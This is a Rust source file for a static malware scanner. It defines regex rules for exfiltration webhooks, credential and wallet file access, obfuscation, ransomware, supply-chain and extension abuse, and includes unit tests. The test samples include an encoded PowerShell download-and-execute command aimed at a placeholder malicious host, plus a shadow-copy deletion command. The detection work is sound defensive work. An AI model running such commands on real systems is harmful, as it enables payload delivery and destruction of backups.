use crate::RuleMatch;
use regex::Regex;
use std::path::Path;
use walkdir::WalkDir;

/// Critical file extensions for scanning
const CRITICAL_EXTENSIONS: &[&str] = &[
    ".py", ".js", ".ts", ".mjs", ".cjs", ".sh", ".bat", ".ps1", ".vbs", ".php", ".java", ".kt",
];

/// Critical filenames (exact match)
const CRITICAL_FILENAMES: &[&str] = &["package.json", "setup.py", "manifest.json", "plugin.xml"];

pub struct Rule {
    pub name: &'static str,
    pub pattern: Regex,
    pub severity: &'static str,
    #[allow(dead_code)]
    pub description: &'static str,
    pub category: &'static str,
}

impl Rule {
    pub fn applies_to(&self, ext: &str, filename: &str) -> bool {
        if self.category == "obfuscation" {
            return true;
        }
        if self.category == "exfiltration" {
            return CRITICAL_EXTENSIONS.contains(&ext) || CRITICAL_FILENAMES.contains(&filename);
        }
        if self.category == "file_access" {
            return CRITICAL_EXTENSIONS.contains(&ext);
        }
        true
    }
}

/// Build static analysis rules.
/// Uses `boxed_regex` via `Regex::new().unwrap()` at startup — compiled once.
pub fn build_rules() -> Vec<Rule> {
    vec![
        // ============================================================
        // EXFILTRATION ENDPOINTS
        // ============================================================
        Rule {
            name: "Discord Webhook",
            pattern: Regex::new(r"discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_-]{30,}").unwrap(),
            severity: "critical",
            description: "Discord webhook URL — data exfiltration",
            category: "exfiltration",
        },
        Rule {
            name: "Telegram Bot API Token",
            pattern: Regex::new(r"(?:https?://)?api\.telegram\.org/bot\d{8,10}:[a-zA-Z0-9_-]{35,40}/").unwrap(),
            severity: "critical",
            description: "Telegram Bot API token — C2/exfiltration channel",
            category: "exfiltration",
        },
        Rule {
            name: "Slack Webhook",
            pattern: Regex::new(r"hooks\.slack\.com/services/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+").unwrap(),
            severity: "high",
            description: "Slack webhook URL — potential data exfiltration",
            category: "exfiltration",
        },
        Rule {
            name: "Hardcoded IP Address",
            pattern: Regex::new(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b").unwrap(),
            severity: "medium",
            description: "Hardcoded IP address — potential C2 server",
            category: "exfiltration",
        },
        Rule {
            name: "AWS Access Key",
            pattern: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),
            severity: "critical",
            description: "AWS Access Key ID detected — credential leak",
            category: "exfiltration",
        },
        Rule {
            name: "AWS Secret Key",
            pattern: Regex::new(r#"(?i)(?:aws_secret_access_key|secretAccessKey)\s*[:=]\s*['"][a-zA-Z0-9/+=]{40}['"]"#).unwrap(),
            severity: "critical",
            description: "AWS Secret Access Key detected — credential leak",
            category: "exfiltration",
        },
        Rule {
            name: "GitHub Token",
            pattern: Regex::new(r"ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22,}").unwrap(),
            severity: "critical",
            description: "GitHub token detected — credential leak",
            category: "exfiltration",
        },
        Rule {
            name: "Generic API Key",
            pattern: Regex::new(r#"(?i)(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*['"][a-zA-Z0-9_-]{16,}['"]"#).unwrap(),
            severity: "high",
            description: "Generic API key or secret detected",
            category: "exfiltration",
        },
        Rule {
            name: "Generic Webhook URL",
            pattern: Regex::new(r"https?://[a-zA-Z0-9.-]+/webhook(?:s)?/").unwrap(),
            severity: "medium",
            description: "Generic webhook URL — potential exfiltration endpoint",
            category: "exfiltration",
        },
        Rule {
            name: "Slack Bot Token",
            pattern: Regex::new(r"xox[baprs]-[0-9a-zA-Z-]{10,}").unwrap(),
            severity: "high",
            description: "Slack bot token detected — credential leak",
            category: "exfiltration",
        },

        // ============================================================
        // SENSITIVE DATA ACCESS
        // ============================================================
        Rule {
            name: "Browser Profile Access",
            pattern: Regex::new(r"(?i)(?:/AppData/Local/(?:Google/)?Chrome|/AppData/Roaming/Discord|Mozilla/Firefox/Profiles)").unwrap(),
            severity: "critical",
            description: "Browser profile/user data access — credential theft",
            category: "file_access",
        },
        Rule {
            name: "Crypto Wallet Access",
            pattern: Regex::new(r"(?i)(?:Wallets?|wallet\.dat|\.bitcoin|\.ethereum|keystore|metamask|phantom)").unwrap(),
            severity: "critical",
            description: "Crypto wallet access — crypto theft indicator",
            category: "file_access",
        },
        Rule {
            name: "Password Manager Access",
            pattern: Regex::new(r"(?i)(?:passwords?\.txt|passwd|credentials\.dat|login\.json|\.npmrc|\.env)").unwrap(),
            severity: "high",
            description: "Credential file access detected",
            category: "file_access",
        },
        Rule {
            name: "Browser Database Access",
            pattern: Regex::new(r"(?i)(?:Login Data|Cookies|Web Data|Local Storage|Session Storage)").unwrap(),
            severity: "high",
            description: "Browser database — session/cookie theft",
            category: "file_access",
        },
        Rule {
            name: "Discord Token Harvesting",
            pattern: Regex::new(r#"(?i)(?:Discord[\\/]Local Storage[\\/]leveldb|discord\.ptb|discord\.canary)"#).unwrap(),
            severity: "critical",
            description: "Discord token file access — account theft",
            category: "file_access",
        },
        Rule {
            name: "SSH Key Access",
            pattern: Regex::new(r"(?i)(?:/\.ssh/|id_rsa|id_dsa|authorized_keys|known_hosts)").unwrap(),
            severity: "high",
            description: "SSH key access — unauthorized access risk",
            category: "file_access",
        },
        Rule {
            name: "Environment Variable Dump",
            pattern: Regex::new(r"(?i)(?:os\.environ|process\.env|getenv\b)").unwrap(),
            severity: "medium",
            description: "Environment variable access — may contain secrets",
            category: "file_access",
        },

        // ============================================================
        // OBFUSCATION & DYNAMIC EXECUTION
        // ============================================================
        Rule {
            name: "eval() Usage",
            pattern: Regex::new(r"\beval\s*\(").unwrap(),
            severity: "high",
            description: "eval() — arbitrary code execution risk",
            category: "obfuscation",
        },
        Rule {
            name: "exec() Usage",
            pattern: Regex::new(r"\bexec\s*\(").unwrap(),
            severity: "high",
            description: "exec() — arbitrary code execution risk",
            category: "obfuscation",
        },
        Rule {
            name: "b64decode + exec Chain",
            pattern: Regex::new(r"(?i)(?:base64\.b64decode|b64decode|from_base64).*(?:exec|eval|run)").unwrap(),
            severity: "critical",
            description: "Base64 decode + exec/eval chain — obfuscation",
            category: "obfuscation",
        },
        Rule {
            name: "nested b64decode",
            pattern: Regex::new(r"(?i)(?:base64\.b64decode\s*\(\s*base64|b64decode\s*\(\s*b64decode)").unwrap(),
            severity: "critical",
            description: "Nested base64 decoding — multi-layer obfuscation",
            category: "obfuscation",
        },
        Rule {
            name: "child_process (Node.js)",
            pattern: Regex::new(r"(?:child_process\.exec|child_process\.execSync|child_process\.spawn)").unwrap(),
            severity: "high",
            description: "child_process — command injection or payload execution",
            category: "obfuscation",
        },
        Rule {
            name: "subprocess (Python)",
            pattern: Regex::new(r"(?:subprocess\.(?:call|Popen|run|check_output|getoutput|check_call))").unwrap(),
            severity: "high",
            description: "subprocess — command execution or payload",
            category: "obfuscation",
        },
        Rule {
            name: "os.system",
            pattern: Regex::new(r"os\.system\s*\(").unwrap(),
            severity: "high",
            description: "os.system() — shell command execution",
            category: "obfuscation",
        },
        Rule {
            name: "PowerShell Encoded Command",
            pattern: Regex::new(r"(?i)(?:-EncodedCommand\s+[a-zA-Z0-9+/=]{50,}|powershell\s+.*-enc\b)").unwrap(),
            severity: "critical",
            description: "PowerShell encoded command — obfuscated execution",
            category: "obfuscation",
        },
        Rule {
            name: "Base64 Overuse",
            pattern: Regex::new(r#"(?i)(?:from\s+base64\s+import|import\s+base64|require\(.base64.\))"#).unwrap(),
            severity: "medium",
            description: "Base64 module import — possible obfuscation",
            category: "obfuscation",
        },
        Rule {
            name: "Dynamic Import/Load",
            pattern: Regex::new(r#"(?i)(?:__import__\(|importlib|execScript|new Function|setTimeout\s*\()"#).unwrap(),
            severity: "medium",
            description: "Dynamic code loading — potential backdoor",
            category: "obfuscation",
        },
        Rule {
            name: "Hex Encoding",
            pattern: Regex::new(r#"(?i)(?:\\x[0-9a-f]{2}\s*\\x[0-9a-f]{2}\s*\\x[0-9a-f]{2}\s*\\x[0-9a-f]{2})"#).unwrap(),
            severity: "high",
            description: "Hex-encoded string sequence — obfuscated content",
            category: "obfuscation",
        },
        Rule {
            name: "XOR Decode Pattern",
            pattern: Regex::new(r"(?i)(?:ord\(.[^)]+.\)\s*\^\s*|charCodeAt\(.[^)]+.\)\s*\^\s*)").unwrap(),
            severity: "high",
            description: "XOR decoding — obfuscation technique",
            category: "obfuscation",
        },
        Rule {
            name: "Long Encoded String",
            pattern: Regex::new(r#"[a-zA-Z0-9+/=]{200,}"#).unwrap(),
            severity: "medium",
            description: "Very long encoded string — potential payload",
            category: "obfuscation",
        },
        Rule {
            name: "os.popen",
            pattern: Regex::new(r"os\.popen\s*\(").unwrap(),
            severity: "high",
            description: "os.popen() — shell command execution",
            category: "obfuscation",
        },
        Rule {
            name: "Process Injection",
            pattern: Regex::new(r"(?i)(?:VirtualAllocEx|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx|RtlCreateUserThread)").unwrap(),
            severity: "critical",
            description: "Windows process injection API calls — malware indicator",
            category: "obfuscation",
        },
        Rule {
            name: "Reflective DLL Loading",
            pattern: Regex::new(r"(?i)(?:ReflectiveLoader|LoadLibraryA|GetProcAddress)").unwrap(),
            severity: "critical",
            description: "Reflective DLL loading — code injection technique",
            category: "obfuscation",
        },

        // ============================================================
        // RANSOMWARE / DESTRUCTIVE
        // ============================================================
        Rule {
            name: "Mass File Encryption",
            pattern: Regex::new(r"(?i)(?:encrypt_file|encrypt_all|cipher\.encrypt|\.encrypt\s*\(|fernet\b.*encrypt)").unwrap(),
            severity: "critical",
            description: "File encryption function — potential ransomware",
            category: "ransomware",
        },
        Rule {
            name: "Shadow Copy Deletion",
            pattern: Regex::new(r"(?i)(?:vssadmin|wmic shadowcopy|bcdedit|bootsect|recovery\s+mode)").unwrap(),
            severity: "critical",
            description: "Shadow copy/backup deletion — ransomware indicator",
            category: "ransomware",
        },
        Rule {
            name: "Encrypted File Extension",
            pattern: Regex::new(r"(?i)(?:\.enc(?:rypted)?|\.locked|\.crypted|\.cry[pt]\b|\.encrypt)").unwrap(),
            severity: "high",
            description: "Encrypted file extension — ransomware victim pattern",
            category: "ransomware",
        },
        Rule {
            name: "Ransom Note",
            pattern: Regex::new(r"(?i)(?:ransom(?:note|ware)|how_to_decrypt|readme_decrypt|your_files|your_data\b|pay\s+\d+\s+btc)").unwrap(),
            severity: "critical",
            description: "Ransom note text — ransomware indicator",
            category: "ransomware",
        },
        Rule {
            name: "Bitcoin Payment Address",
            pattern: Regex::new(r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap(),
            severity: "high",
            description: "Bitcoin address — potential ransom payment",
            category: "ransomware",
        },

        // ============================================================
        // SUPPLY CHAIN ATTACK
        // ============================================================
        Rule {
            name: "Post-Install Script",
            pattern: Regex::new(r#"(?i)"postinstall"\s*:\s*"|"preinstall"\s*:\s*""#).unwrap(),
            severity: "high",
            description: "npm postinstall/preinstall — supply chain attack vector",
            category: "supply_chain",
        },
        Rule {
            name: "Typo-squatting Package Name",
            pattern: Regex::new(r#"(?i)["'](?:cross-env|npm-run|gul[pl]-|grunt-cli|node-sass|bower)["']"#).unwrap(),
            severity: "medium",
            description: "Suspicious package name — possible typo-squatting",
            category: "supply_chain",
        },
        Rule {
            name: "Remote Script Download",
            pattern: Regex::new(r#"(?i)(?:curl\s+-s(?:SL)?\s+https?://|wget\s+-q\s+https?://)\S+\.(?:ps1|sh|bat|py)\b"#).unwrap(),
            severity: "high",
            description: "Remote script download — payload delivery",
            category: "supply_chain",
        },
        Rule {
            name: "URL Fetch Command",
            pattern: Regex::new(r"(?i)(?:Invoke-WebRequest|curl\b|wget\b|fetch\(|axios\.get|request\.get)").unwrap(),
            severity: "medium",
            description: "URL fetching — possible external payload download",
            category: "supply_chain",
        },
        Rule {
            name: "Hidden Directory Script",
            pattern: Regex::new(r"(?i)[\\/]\.\w+[\\/](?:install|setup|config)").unwrap(),
            severity: "medium",
            description: "Script in hidden directory — suspicious",
            category: "supply_chain",
        },

        // ============================================================
        // VS CODE EXTENSION / IDE PLUGIN SECURITY
        // ============================================================
        Rule {
            name: "VS Code Session/Token Stealing",
            pattern: Regex::new(r"(?i)vscode\.authentication\.getSession\s*\(").unwrap(),
            severity: "critical",
            description: "Accessing VS Code authentication session — token theft indicator",
            category: "exfiltration",
        },
        Rule {
            name: "VS Code Clipboard Harvesting",
            pattern: Regex::new(r"(?i)vscode\.env\.clipboard\.readText\s*\(").unwrap(),
            severity: "high",
            description: "Reading clipboard contents silently in extension",
            category: "file_access",
        },
        Rule {
            name: "VS Code Workspace File Reading",
            pattern: Regex::new(r"(?i)vscode\.workspace\.fs\.readFile\s*\(").unwrap(),
            severity: "medium",
            description: "Reading workspace files via VS Code API",
            category: "file_access",
        },
        Rule {
            name: "VS Code Wildcard Activation",
            pattern: Regex::new(r#"(?i)"activationEvents"\s*:\s*\[[^\]]*["'](?:\*|onStartupFinished)["']"#).unwrap(),
            severity: "medium",
            description: "Extension executes automatically on startup without user trigger",
            category: "supply_chain",
        },

        // ============================================================
        // JETBRAINS PLUGIN MALWARE RULES
        // ============================================================
        Rule {
            name: "JetBrains Dynamic Classloading",
            pattern: Regex::new(r"(?i)(?:URLClassLoader|ClassLoader\.defineClass|DexClassLoader)\s*\(").unwrap(),
            severity: "critical",
            description: "Dynamic Java/Kotlin classloader — payload injection indicator",
            category: "obfuscation",
        },
        Rule {
            name: "JetBrains Process Execution",
            pattern: Regex::new(r"(?i)(?:Runtime\.getRuntime\(\)\.exec|ProcessBuilder)\s*\(").unwrap(),
            severity: "high",
            description: "Executing OS processes from plugin code",
            category: "obfuscation",
        },
        Rule {
            name: "JetBrains Malicious Reflection",
            pattern: Regex::new(r"(?i)(?:Method\.invoke|Field\.setAccessible)\s*\(").unwrap(),
            severity: "medium",
            description: "Java reflection to bypass access control or security managers",
            category: "obfuscation",
        },
        Rule {
            name: "JetBrains Raw Socket Exfiltration",
            pattern: Regex::new(r"(?i)java\.net\.(?:Socket|HttpURLConnection|URL)\s*").unwrap(),
            severity: "medium",
            description: "Raw networking call for beaconing or exfiltration",
            category: "exfiltration",
        },

        // ============================================================
        // CHROME / BROWSER EXTENSION MALWARE RULES
        // ============================================================
        Rule {
            name: "Browser Extension Dangerous Permissions",
            pattern: Regex::new(r#"(?i)"(?:permissions|optional_permissions)"\s*:\s*\[[^\]]*["'](?:\*://\*|<all_urls>|webRequestBlocking|debugger|nativeMessaging)["']"#).unwrap(),
            severity: "high",
            description: "High-risk browser extension permission targeting all network traffic or debugging",
            category: "supply_chain",
        },
        Rule {
            name: "Browser Extension Dynamic Code Execution",
            pattern: Regex::new(r"(?i)(?:chrome\.tabs\.executeScript|unsafe-eval)").unwrap(),
            severity: "high",
            description: "Dynamic script injection or CSP unsafe-eval in extension",
            category: "obfuscation",
        },
        Rule {
            name: "Browser Extension Keystroke Logger",
            pattern: Regex::new(r#"(?i)addEventListener\s*\(\s*["']key(?:down|press|up)["']"#).unwrap(),
            severity: "high",
            description: "Key event listener indicating potential keylogger",
            category: "exfiltration",
        },
        Rule {
            name: "Browser Extension Cookie/Token Theft",
            pattern: Regex::new(r"(?i)chrome\.(?:cookies\.getAll|storage\.local\.get)").unwrap(),
            severity: "high",
            description: "Harvesting browser cookies or local extension storage",
            category: "file_access",
        },
    ]
}

pub fn is_critical_file(filename: &str) -> bool {
    let lower = filename.to_lowercase();
    if CRITICAL_FILENAMES.contains(&lower.as_str()) {
        return true;
    }
    CRITICAL_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
}

pub fn get_extension(filename: &str) -> &str {
    let lower = filename.to_lowercase();
    for ext in CRITICAL_EXTENSIONS {
        if lower.ends_with(ext) {
            return ext;
        }
    }
    ""
}

/// Scan directory, optionally restricted to `changed` repo-relative paths
/// (used by `--changed-only` for PR scans).
pub fn scan_directory_filtered<P: AsRef<Path>>(
    dir: P,
    custom_yara_dir: Option<&Path>,
    changed: Option<&std::collections::HashSet<std::path::PathBuf>>,
) -> (usize, usize, Vec<RuleMatch>) {
    let rules = build_rules();
    let yara_engine = crate::yara_engine::YaraEngine::new(custom_yara_dir);
    let mut matches = Vec::new();
    let mut total_files = 0usize;
    let mut scanned_files = 0usize;

    let skip_dirs: &[&str] = &[
        ".git",
        "node_modules",
        "__pycache__",
        ".tox",
        ".eggs",
        "target",
        "venv",
        ".venv",
    ];

    for entry in WalkDir::new(dir.as_ref()).into_iter().filter_entry(|e| {
        let name = e.file_name().to_string_lossy();
        !e.path().is_dir() || !skip_dirs.contains(&name.as_ref())
    }) {
        let entry = match entry {
            Ok(e) => e,
            Err(_) => continue,
        };

        if !entry.file_type().is_file() {
            continue;
        }

        total_files += 1;

        let filename = entry.file_name().to_string_lossy().to_string();
        if !is_critical_file(&filename) {
            continue;
        }

        scanned_files += 1;

        // Read up to 1MB
        let content = match std::fs::read_to_string(entry.path()) {
            Ok(c) if c.len() <= 1_048_576 => c,
            _ => continue,
        };

        let rel_path = entry
            .path()
            .strip_prefix(dir.as_ref())
            .unwrap_or(entry.path())
            .to_string_lossy()
            .to_string();

        // `--changed-only` filter: skip files not in the changed set
        if let Some(changed) = changed {
            if !changed.contains(std::path::Path::new(&rel_path)) {
                continue;
            }
        }

        // Whole-file inline suppression marker
        if content.contains("kalascan:ignore-file") {
            continue;
        }

        let ext = get_extension(&filename);

        for rule in &rules {
            if !rule.applies_to(ext, &filename) {
                continue;
            }

            for cap in rule.pattern.find_iter(&content) {
                if line_has_ignore_marker(&content, cap.start()) {
                    continue;
                }
                let line_num = content[..cap.start()].matches('\n').count() + 1;
                let context = get_context(&content, cap.start(), cap.end());

                matches.push(RuleMatch {
                    file_path: rel_path.clone(),
                    line_number: line_num,
                    matched_pattern: rule.name.to_string(),
                    severity: rule.severity.to_string(),
                    context,
                });
            }
        }

        // Advanced entropy, invisible zero-width, Trojan Source, homoglyphs
        let entropy_matches = crate::entropy::scan_advanced_obfuscation(&rel_path, &content);
        matches.extend(entropy_matches);

        // YARA rules matching
        let yara_matches = yara_engine.scan_data(&rel_path, content.as_bytes());
        matches.extend(yara_matches);
    }

    (total_files, scanned_files, matches)
}

fn line_has_ignore_marker(content: &str, start: usize) -> bool {
    let line_start = content[..start].rfind('\n').map(|i| i + 1).unwrap_or(0);
    let line_end = content[start..]
        .find('\n')
        .map(|i| start + i)
        .unwrap_or(content.len());
    content[line_start..line_end].contains("kalascan:ignore")
}

fn get_context(content: &str, start: usize, end: usize) -> String {
    let before = content[..start]
        .rsplit('\n')
        .take(3)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect::<Vec<_>>()
        .join("\n");

    let matched = &content[start..end];
    let after = content[end..]
        .split('\n')
        .take(3)
        .collect::<Vec<_>>()
        .join("\n");

    let mut ctx = format!("{}\n>>> {} <<<\n{}", before, matched, after);
    if ctx.len() > 200 {
        ctx = format!("{}...", &ctx[..200]);
    }
    ctx
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_discord_webhook_rule() {
        let rules = build_rules();
        let webhook = rules.iter().find(|r| r.name == "Discord Webhook").unwrap();
        assert!(webhook.pattern.is_match("discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst"));
    }

    #[test]
    fn test_telegram_rule() {
        let rules = build_rules();
        let tg = rules
            .iter()
            .find(|r| r.name == "Telegram Bot API Token")
            .unwrap();
        assert!(tg.pattern.is_match("https://api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm/sendMessage"));
    }

    #[test]
    fn test_aws_key_rule() {
        let rules = build_rules();
        let aws = rules.iter().find(|r| r.name == "AWS Access Key").unwrap();
        assert!(aws.pattern.is_match("AKIA1234567890123456"));
    }

    #[test]
    fn test_github_token_rule() {
        let rules = build_rules();
        let gh = rules.iter().find(|r| r.name == "GitHub Token").unwrap();
        assert!(gh
            .pattern
            .is_match("ghp_abcdefghijklmnopqrstuvwxyz1234567890"));
    }

    #[test]
    fn test_eval_rule() {
        let rules = build_rules();
        let eval = rules.iter().find(|r| r.name == "eval() Usage").unwrap();
        assert!(eval.pattern.is_match("eval(user_input)"));
    }

    #[test]
    fn test_is_critical_file() {
        assert!(is_critical_file("script.py"));
        assert!(is_critical_file("script.js"));
        assert!(is_critical_file("batch.bat"));
        assert!(is_critical_file("package.json"));
        assert!(!is_critical_file("readme.md"));
        assert!(!is_critical_file("image.png"));
    }

    #[test]
    fn test_subprocess_rule() {
        let rules = build_rules();
        let sp = rules
            .iter()
            .find(|r| r.name == "subprocess (Python)")
            .unwrap();
        assert!(sp.pattern.is_match("subprocess.Popen(['cmd.exe']"));
        assert!(sp.pattern.is_match("subprocess.call(['ls']"));
    }

    #[test]
    fn test_powershell_encoded() {
        let rules = build_rules();
        let ps = rules
            .iter()
            .find(|r| r.name == "PowerShell Encoded Command")
            .unwrap();
        assert!(ps.pattern.is_match("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA=="));
    }

    #[test]
    fn test_ransomware_rule() {
        let rules = build_rules();
        let rw = rules
            .iter()
            .find(|r| r.name == "Shadow Copy Deletion")
            .unwrap();
        assert!(rw.pattern.is_match("vssadmin delete shadows /all /quiet"));
    }

    #[test]
    fn test_vscode_extension_rules() {
        let rules = build_rules();
        let auth = rules
            .iter()
            .find(|r| r.name == "VS Code Session/Token Stealing")
            .unwrap();
        assert!(auth.pattern.is_match(
            "const session = await vscode.authentication.getSession('github', ['repo']);"
        ));

        let clip = rules
            .iter()
            .find(|r| r.name == "VS Code Clipboard Harvesting")
            .unwrap();
        assert!(clip
            .pattern
            .is_match("const text = await vscode.env.clipboard.readText();"));

        let fs = rules
            .iter()
            .find(|r| r.name == "VS Code Workspace File Reading")
            .unwrap();
        assert!(fs
            .pattern
            .is_match("const file = await vscode.workspace.fs.readFile(uri);"));

        let act = rules
            .iter()
            .find(|r| r.name == "VS Code Wildcard Activation")
            .unwrap();
        assert!(act
            .pattern
            .is_match(r#""activationEvents": [ "*", "onCommand:myExt.start" ]"#));
    }

    #[test]
    fn test_jetbrains_plugin_rules() {
        let rules = build_rules();
        let cl = rules
            .iter()
            .find(|r| r.name == "JetBrains Dynamic Classloading")
            .unwrap();
        assert!(cl
            .pattern
            .is_match("URLClassLoader loader = new URLClassLoader(urls);"));

        let pe = rules
            .iter()
            .find(|r| r.name == "JetBrains Process Execution")
            .unwrap();
        assert!(pe.pattern.is_match("Runtime.getRuntime().exec(cmd);"));
    }

    #[test]
    fn test_browser_extension_rules() {
        let rules = build_rules();
        let perm = rules
            .iter()
            .find(|r| r.name == "Browser Extension Dangerous Permissions")
            .unwrap();
        assert!(perm
            .pattern
            .is_match(r#""permissions": ["<all_urls>", "storage"]"#));

        let eval = rules
            .iter()
            .find(|r| r.name == "Browser Extension Dynamic Code Execution")
            .unwrap();
        assert!(eval
            .pattern
            .is_match("chrome.tabs.executeScript(tabId, { code: payload });"));
    }
}
